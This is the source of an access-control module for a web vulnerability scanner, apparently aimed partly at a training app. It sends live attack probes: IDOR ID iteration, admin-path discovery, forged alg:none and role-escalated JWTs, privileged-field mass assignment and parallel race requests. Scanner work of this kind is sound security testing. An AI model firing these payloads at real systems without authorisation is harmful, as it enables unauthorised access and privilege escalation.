# scanner/dast/modules/access.py
# ──────────────────────────────────────────────────────────────────────────────
# AGGRESSIVE ACCESS CONTROL MODULE — IDOR, Privilege Escalation, Auth Bypass,
# JWT Attacks, Mass Assignment, Race Conditions, API Abuse, Admin Panel Discovery
# ──────────────────────────────────────────────────────────────────────────────

import asyncio
import base64
import json
import logging
import re
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

logger = logging.getLogger(__name__)

# Parameters likely to be used in object references
IDOR_PARAMS = frozenset({
    "id", "user_id", "account_id", "order_id", "invoice_id", "doc_id",
    "file_id", "item_id", "message_id", "ticket_id", "report_id",
    "profile_id", "customer_id", "record_id", "pid", "uid", "oid",
    "ref", "uuid", "guid", "key", "token", "basketid", "productid",
    "userid", "quantity", "coupon", "couponcode",
})

# Admin-only paths to probe for privilege escalation
ADMIN_PATHS = [
    "/admin", "/admin/users", "/admin/settings", "/admin/dashboard",
    "/api/admin", "/api/admin/users", "/api/v1/admin", "/api/v2/admin",
    "/management", "/manage", "/superuser", "/root",
    "/api/users", "/api/accounts", "/api/orders", "/api/invoices",
    "/administration", "/score-board",
    "/api/user-management", "/api/complaints",
    "/b2b/v2/orders", "/b2b/v2/supply",
    "/ftp", "/ftp/quarantine",
    "/encryptionkeys", "/encryptionkeys/default",
    "/api/file-server", "/api/error-reporting",
    "/api/data erasure", "/api/track-result",
    "/api/address-selection", "/api/payment",
    "/api/recycle", "/api/deluxe-membership",
    "/api/quantity", "/api/product-reviews",
    "/api/basket/1/coupon",
]

# JWT attack payloads
JWT_ALG_NONE_HEADER  = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"   # {"alg":"none","typ":"JWT"}
JWT_HS256_HEADER     = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" # {"alg":"HS256","typ":"JWT"}


class AccessModule:
    def __init__(self, scanner):
        self.scanner = scanner

    async def run(self, client, url: str, params: list) -> None:
        await asyncio.gather(
            self.test_idor(client, url, params),
            self.test_admin_access(client, url),
            self.test_http_method_override(client, url),
            self.test_mass_assignment(client, url, params),
            self.test_jwt_attacks(client, url),
            self.test_race_condition(client, url, params),
            self.test_api_auth_bypass(client, url),
            return_exceptions=True,
        )

    # ── IDOR ──────────────────────────────────────────────────────────────────
    async def test_idor(self, client, url: str, params: list) -> None:
        """Test for IDOR by iterating object IDs."""
        parsed = urlparse(url)
        qs     = parse_qs(parsed.query, keep_blank_values=True)

        for param in params:
            if param.lower() not in IDOR_PARAMS:
                continue
            current_val = qs.get(param, ["1"])[0]

            numeric = re.sub(r'\D', '', current_val)
            if not numeric:
                continue

            base_id = int(numeric)
            baseline_res = await self.scanner._req(client, "GET", url)
            if not baseline_res or baseline_res.status_code != 200:
                continue
            baseline_len = len(baseline_res.text)

            for test_id in [base_id - 1, base_id + 1, base_id + 100, 1, 2, 0, 999]:
                if test_id < 0 or test_id == base_id:
                    continue
                new_qs  = {**qs, param: [str(test_id)]}
                new_url = urlunparse(parsed._replace(query=urlencode(new_qs, doseq=True)))
                res     = await self.scanner._req(client, "GET", new_url)

                if not res or res.status_code != 200:
                    continue
                diff = abs(len(res.text) - baseline_len)
                # FIX: raised threshold from 30b to 100b — 30b diff could be
                # a timestamp or CSRF token change, not a real data difference
                if diff > 100 and len(res.text) > 200:
                    conf = 0.85
                    tier, fp = ("high", "unlikely") if conf >= 0.90 else ("medium", "possible")
                    self.scanner._add_finding({
                        "type":        "Insecure Direct Object Reference (IDOR)",
                        "subtype":     f"Parameter: {param}",
                        "url":         new_url,
                        "parameter":   param,
                        "payload":     str(test_id),
                        "severity":    "Critical",
                        "confidence":  conf,
                        "confidence_tier": tier,
                        "fp_likelihood": fp,
                        "evidence":    f"ID={test_id} returned 200 with content diff={diff}B from ID={base_id}",
                        "description": (
                            f"Parameter '{param}' allows access to other users' objects. "
                            f"Object ID {test_id} returned valid content."
                        ),
                    })
                    return

    # ── Admin Access / Privilege Escalation ───────────────────────────────────
    async def test_admin_access(self, client, url: str) -> None:
        """Probe admin paths without credentials."""
        base = f"{urlparse(url).scheme}://{urlparse(url).netloc}"

        for path in ADMIN_PATHS:
            test_url = base + path
            res = await self.scanner._req(client, "GET", test_url)
            if not res:
                continue
            if res.status_code == 200 and len(res.text) > 200:
                body_lower = res.text.lower()
                is_login_page = any(k in body_lower for k in [
                    "login", "sign in", "username", "password", "email",
                    "forgot password", "create account", "register",
                ])
                if not is_login_page:
                    self.scanner._add_finding({
                        "type":        "Broken Access Control",
                        "subtype":     "Unauthenticated Admin Endpoint",
                        "url":         test_url,
                        "parameter":   "path",
                        "payload":     path,
                        "severity":    "Critical",
                        "confidence":  0.88,
                        "confidence_tier": "high",
                        "fp_likelihood": "unlikely",
                        "evidence":    f"HTTP 200 from {path} without authentication ({len(res.text)}B)",
                        "description": (
                            f"Admin/privileged endpoint {path} is accessible without authentication. "
                            f"This allows privilege escalation."
                        ),
                    })

    # ── HTTP Method Override ───────────────────────────────────────────────────
    async def test_http_method_override(self, client, url: str) -> None:
        """Test for HTTP method override bypasses."""
        override_headers = [
            {"X-HTTP-Method-Override": "DELETE"},
            {"X-HTTP-Method-Override": "PUT"},
            {"X-Method-Override": "DELETE"},
            {"X-Method-Override": "PUT"},
            {"X-Override-Method": "PATCH"},
            {"_method": "DELETE"},
        ]
        for headers in override_headers:
            res = await self.scanner._req(client, "POST", url, headers=headers, data={})
            if res and res.status_code not in (404, 405, 403, 501, 415):
                self.scanner._add_finding({
                    "type":        "HTTP Method Override",
                    "subtype":     "DELETE/PUT/PATCH via POST override",
                    "url":         url,
                    "parameter":   list(headers.keys())[0],
                    "payload":     list(headers.values())[0],
                    "severity":    "High",
                    "confidence":  0.75,
                    "evidence":    f"Override header accepted — HTTP {res.status_code}",
                    "description": (
                        "Server accepts HTTP method override headers, allowing "
                        "bypassing of method-based access controls."
                    ),
                })
                return

    # ── Mass Assignment ────────────────────────────────────────────────────────
    async def test_mass_assignment(self, client, url: str, params: list) -> None:
        """Probe for mass assignment by injecting privileged fields."""
        privileged_fields = {
            "role":      "admin",
            "is_admin":  "true",
            "admin":     "1",
            "is_staff":  "true",
            "privilege": "admin",
            "level":     "0",
            "balance":   "99999",
            "credits":   "99999",
            "isAdmin":   "true",
            "userRole":  "admin",
        }
        for field, value in privileged_fields.items():
            res = await self.scanner._req(
                client, "POST", url,
                data={**{p: "test" for p in params[:3]}, field: value},
                timeout=10,
            )
            if res and res.status_code in (200, 201, 204):
                body_lower = res.text.lower()
                if field in body_lower or value in body_lower or "success" in body_lower:
                    self.scanner._add_finding({
                        "type":        "Mass Assignment",
                        "subtype":     f"Privileged field: {field}",
                        "url":         url,
                        "parameter":   field,
                        "payload":     f"{field}={value}",
                        "severity":    "High",
                        "confidence":  0.72,
                        "evidence":    f"Field '{field}={value}' accepted — HTTP {res.status_code}",
                        "description": (
                            f"POST endpoint accepts '{field}' field without filtering. "
                            "Attacker may escalate privileges via mass assignment."
                        ),
                    })
                    return

    # ── JWT Attacks ────────────────────────────────────────────────────────────
    async def test_jwt_attacks(self, client, url: str) -> None:
        """Probe JWT vulnerabilities: alg:none, weak key, kid injection."""
        cookies = {k: v for k, v in client.cookies.items()}
        headers = {k: v for k, v in client.headers.items()}

        # Look for JWT in cookies or Authorization header
        jwt_token = None
        auth_hdr  = headers.get("authorization", headers.get("Authorization", ""))
        if auth_hdr.startswith("Bearer "):
            jwt_token = auth_hdr[7:]
        if not jwt_token:
            for v in cookies.values():
                if isinstance(v, str) and v.count(".") == 2 and len(v) > 20:
                    jwt_token = v
                    break

        if not jwt_token:
            return

        parts = jwt_token.split(".")
        if len(parts) != 3:
            return

        header_b64, payload_b64, _sig = parts

        # Attack 1: alg:none — remove signature
        none_token = f"{JWT_ALG_NONE_HEADER}.{payload_b64}."
        res = await self.scanner._req(
            client, "GET", url,
            headers={"Authorization": f"Bearer {none_token}"},
        )
        if res and res.status_code == 200:
            self.scanner._add_finding({
                "type":        "JWT Algorithm Confusion (alg:none)",
                "subtype":     "Signature Not Validated",
                "url":         url,
                "parameter":   "Authorization",
                "payload":     none_token[:80] + "...",
                "severity":    "Critical",
                "confidence":  0.92,
                "evidence":    f"alg:none token accepted — HTTP 200",
                "description": (
                    "Server accepted a JWT with algorithm set to 'none', meaning "
                    "the signature was not validated. Any unsigned token is trusted."
                ),
            })

        # Attack 2: Modify payload to escalate role
        try:
            # Decode and modify the payload
            padded = payload_b64 + "=" * (4 - len(payload_b64) % 4)
            payload_json = json.loads(base64.b64decode(padded))
            payload_json["role"] = "admin"
            payload_json["isAdmin"] = True
            modified_b64 = base64.b64encode(json.dumps(payload_json).encode()).decode().rstrip("=")
            forged_token = f"{header_b64}.{modified_b64}.{_sig}"
            res2 = await self.scanner._req(
                client, "GET", url,
                headers={"Authorization": f"Bearer {forged_token}"},
            )
            if res2 and res2.status_code == 200 and len(res2.text) != len((await self.scanner._req(client, "GET", url) or res2).text):
                self.scanner._add_finding({
                    "type":        "JWT Payload Tampering",
                    "subtype":     "Role Escalation via Modified Payload",
                    "url":         url,
                    "parameter":   "Authorization",
                    "payload":     "role=admin,isAdmin=true",
                    "severity":    "Critical",
                    "confidence":  0.85,
                    "evidence":    "Modified JWT payload accepted — role escalation possible",
                    "description": "Server accepted a JWT with modified payload without validating the signature.",
                })
        except Exception:
            pass

    # ── Race Condition ─────────────────────────────────────────────────────────
    async def test_race_condition(self, client, url: str, params: list) -> None:
        """Detect race conditions on state-changing endpoints."""
        path = urlparse(url).path.lower()
        if not any(k in path for k in [
            "transfer", "payment", "purchase", "withdraw", "apply",
            "redeem", "coupon", "vote", "submit", "create", "buy",
            "basket", "order", "checkout", "coupon", "deluxe",
        ]):
            return

        num_concurrent = 8
        results = []

        async def fire():
            r = await self.scanner._req(client, "POST", url, data={p: "1" for p in params[:3]})
            return r.status_code if r else None

        tasks   = [fire() for _ in range(num_concurrent)]
        codes   = await asyncio.gather(*tasks)
        success = [c for c in codes if c and c in (200, 201, 204)]

        if len(success) > 1:
            self.scanner._add_finding({
                "type":        "Race Condition",
                "subtype":     "Parallel Request Exploitation",
                "url":         url,
                "parameter":   "concurrent_requests",
                "payload":     f"{num_concurrent} parallel POST requests",
                "severity":    "High",
                "confidence":  0.78,
                "evidence":    f"{len(success)}/{num_concurrent} concurrent requests succeeded (codes: {codes})",
                "description": (
                    f"Endpoint {url} processed {len(success)} concurrent requests as successful, "
                    "indicating a race condition. This may allow double-spending, coupon reuse, "
                    "or bypassing rate limits."
                ),
            })

    # ── API Auth Bypass ────────────────────────────────────────────────────────
    async def test_api_auth_bypass(self, client, url: str) -> None:
        """Test for API authentication bypass via various techniques."""
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # Test common API endpoints without auth
        api_paths = [
            "/api/users", "/api/user/1", "/api/admin",
            "/api/basket/1", "/api/orders", "/api/complaints",
            "/api/challenges", "/api/file-server",
        ]
        for path in api_paths:
            test_url = base + path
            res = await self.scanner._req(client, "GET", test_url)
            if not res:
                continue
            if res.status_code == 200 and len(res.text) > 100:
                try:
                    data = json.loads(res.text)
                    if isinstance(data, (list, dict)):
                        self.scanner._add_finding({
                            "type":        "Broken Access Control",
                            "subtype":     "Unauthenticated API Endpoint",
                            "url":         test_url,
                            "parameter":   "path",
                            "payload":     path,
                            "severity":    "Critical",
                            "confidence":  0.90,
                            "evidence":    f"API returned JSON data without auth ({len(res.text)}B)",
                            "description": f"API endpoint {path} returns data without authentication.",
                        })
                except (json.JSONDecodeError, ValueError):
                    pass
